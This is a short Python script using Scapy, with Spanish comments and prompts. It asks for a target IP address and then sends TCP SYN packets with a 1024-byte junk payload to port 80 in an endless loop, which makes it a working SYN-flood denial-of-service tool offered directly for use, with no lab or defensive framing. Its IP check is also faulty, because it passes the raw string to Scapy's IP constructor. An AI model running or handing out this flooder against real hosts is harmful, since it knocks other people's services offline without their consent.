from scapy.all import *
import re
import sys

# Función para validar la IP (IPv4)
def is_valid_ip(ip):
    try:
        # Usamos scapy para validar IP
        ip_obj = IP(ip)
        return ip_obj.dst is not None
    except Exception:
        return False

# Función para mostrar el uso correcto del script
def print_usage():
    print("Uso: python script.py")
    print("Asegúrate de ejecutar el script con permisos de administrador.")
    sys.exit(1)

# Solicita la IP del usuario
ip_addr = input("Ingresa la IP\n=> ")

# Valida la IP
if not is_valid_ip(ip_addr):
    print("La IP ingresada no es válida o no está en el formato correcto.")
    print_usage()

port = 80

# Crea la capa IP
ip_layer = IP(dst=ip_addr)

# Crea la capa TCP con el puerto de destino especificado y el flag SYN
tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")

# Crea la carga útil (payload) RAW
raw_layer = Raw(b"X" * 1024)

# Combina capas IP, TCP y RAW
packet = ip_layer / tcp_layer / raw_layer

print(f"Enviando paquetes SYN a {ip_addr}:{port}. Presiona Ctrl+C para detener.")

try:
    # Envia el paquete en un bucle
    while True:
        send(packet, verbose=1)
except KeyboardInterrupt:
    print("\nInterrupción del usuario. Script terminado.")
except Exception as e:
    print(f"Error: {e}")
